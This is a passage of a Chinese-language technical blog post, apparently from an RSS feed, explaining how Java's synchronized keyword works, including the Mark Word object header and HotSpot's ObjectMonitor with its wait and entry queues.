修饰实例方法，作用于当前实例加锁，进入同步代码前要获得当前实例的锁 修饰静态方法，作用于当前类对象加锁，进入同步代码前要获得当前类对象的锁 修饰代码块，指定加锁对象，对给定对象加锁，进入同步代码库前要获得给定对象的锁。 上面三种方式的具体实现这里就不一一列举了，因为这篇文章的着重点还是在于理解，所以那种基本的实现就不赘述了，这里说一下同步代码块的事情，有的时候我们编写的方法体很大，其中可能还会包含很多耗时的操作，而需要同步的只有一小部分，如果直接对整个方法进行同步代价是很大的，这个时候我们使用同步代码块对那一小部分进行同步就好了
synchronized关键字不仅可以保证操作的原子性、可见性，还可以避免指令重排产生的问题。使用这个关键字也就是将访问当前共享资源的数目限制2为单线程，单线程的情况下可以保证不会出现原子性问题，同时，也就保证了可见性，因为synchronized关键字每次进行加锁操作时都是从主存中读取数据，每次释放锁时都需要刷新主存，这种方法比较暴力，也就是说处理的粒度很大，这一点可以采用轻量级的、小粒度的volatile关键字实现，那么synchronized关键字是如何避免指令重排问题的呢？**	**sync关键字并没有禁止指令重排，指令重排只会在多线程情况下出现问题，而使用sync关键字之后相当于对共享数据进行单线程操作了，所以是有指令重排，但是没关系
2.synchronized关键字底层原理 如果说到synchronized的底层，就一定要提到monitor对象，不管是同步方法还是同步代码块，都是通过这个对象进行同步的，那么这个对象是什么呢？
我们知道对象的内存布局一共分为三部分：
实例变量：存放类的属性数据信息，包括父类的属性信息，如果是数组的实例部分还包括数组的长度，这部分内存按4字节对齐 填充数据：虚拟机要求对象的其实地址必须是8字节的整数倍，填充数据不是必须存在的，仅仅是为了字节对齐。 下面重点来看一下对象头。
一般来说，synchronized关键字使用的锁对象是存储在Java对象头里面的，对象头主要包括两部分数据：Mark Word（标记字段）、Class Pointer（类型指针）。
Mark Word 用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程 ID、偏向时间戳等。
以下是32位JVM的Mark Word默认存储结构：
锁状态 25bit 4bit 1bit是否是偏向锁 2bit 锁标志位 无锁状态 对象HashCode 对象分代年龄 0 01 对象头的信息是与对象自身定义的数据没有关系的额外存储成本，考虑到JVM的空间效率，Mark Word被设计为一个非固定的数据结构，以便复用。除了以上默认存储结构以外，还可能有如下变化的结构：
其中，重量级锁，也就是synchronized锁标识位为10，其中指针指向的是monitor对象的起始地址，每个对象都存在着一个monitor与之关联，在HotSpot虚拟机中，monitor是由ObjectMonitir实现的，其主要数据结构如下：
ObjectMonitor() { _header = NULL; _count = 0; //记录个数 _waiters = 0, _recursions = 0; _object = NULL; _owner = NULL; _WaitSet = NULL; //处于wait状态的线程，会被加入到_WaitSet _WaitSetLock = 0 ; _Responsible = NULL ; _succ = NULL ; _cxq = NULL ; FreeNext = NULL ; _EntryList = NULL ; //处于等待锁block状态的线程，会被加入到该列表 _SpinFreq = 0 ; _SpinClock = 0 ; OwnerIsThread = 0 ; } ObjectMonitor中有两个队列WaitSet和EntrySet，用来保存ObjectWaiter对象列表(每个等待锁的线程都会被封装成ObjectWaiter对象)，_owner指向持有ObjectMonitor对象的线程，当多个线程同时访问一段同步代码时，首先会进入EntryList集合，当线程获取到对象的monitor之后进入owner区域把owner变量设置为当前线程，并为monitor中计数器count+1，若线程调用wait()方法，将释放当前持有的monitor，owner变量恢复为null，count&amp;ndash;，同时该线程进入WaitSet集合中等待被唤醒。若当前线程执行完毕也将释放monitor(锁)并恢复owner变量值为null，以便其他线程进入获取monitor(锁)，流程如下图所示：</description>
    </item>
    
  </channel>
</rss>
